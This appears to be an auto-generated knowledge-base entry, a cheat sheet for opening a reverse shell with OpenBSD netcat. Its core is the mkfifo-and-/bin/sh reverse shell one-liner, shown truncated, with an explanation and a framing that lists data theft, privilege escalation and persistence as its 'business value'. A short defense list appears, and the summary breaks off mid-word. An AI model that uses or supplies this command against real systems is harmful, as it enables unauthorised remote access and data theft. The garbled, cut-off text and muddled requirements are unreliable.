---
id: 9410165f-fe9f-438a-9c24-173d9d40993c
name: Netcat OpenBsd Reverse Shell Cheat Sheet
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:24.387458+00:00'
updated_at: '2023-04-10T20:25:30.180775+00:00'
tags:
- '[[Netcat OpenBsd]]'
- '[[Reverse Shell]]'
- '[[Reverse Shell Cheat Sheet]]'
---

# Netcat OpenBsd Reverse Shell Cheat Sheet

## Summary

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. This can be useful for bypassing firewalls or other network restrictions. Netcat is a versatile networking tool that can be used to create reverse shells. This cheat sheet focuses on using Net

## Description

# Description

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. This can be useful for bypassing firewalls or other network restrictions. Netcat is a versatile networking tool that can be used to create reverse shells. This cheat sheet focuses on using Netcat with OpenBsd to create a reverse shell.

Technical Explanation: Netcat is used to listen on a specified port on the attacking machine. The target machine connects back to this port, and a shell is opened on the attacking machine. This can be useful for executing commands on the target machine or transferring files.

Business Value: A reverse shell can be used to gain remote access to a target machine, which can be useful for a variety of purposes such as data theft, privilege escalation, or persistence.

 

## Requirements

1. OpenBsd installed on the attacking machine

1. Netcat installed on the attacking machine

 

## Defense

1. Use a firewall to block incoming traffic on the listening port

1. Limit network access to only trusted machines

1. Regularly monitor network traffic for suspicious activity

 

## Objectives

1. Gain remote access to a target machine

 

# Instructions

1. This command creates a reverse shell connection to a remote server. It first removes any existing /tmp/f file, then creates a named pipe using mkfifo command. It then pipes the contents of the named pipe to /bin/sh -i, which starts an interactive shell. The output of the shell is then redirected to the named pipe, which is connected to a remote server using netcat.

 



**Code**: [[rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2]]



> The command takes two arguments: the IP address of the remote server and the port number to connect to. The IP address and port number should be replaced with the appropriate values for the remote server. Once the command is executed, it will establish a reverse shell connection to the specified server, allowing the attacker to execute commands on the remote system.

## Tags

- [[Netcat OpenBsd]]
- [[Reverse Shell]]
- [[Reverse Shell Cheat Sheet]]


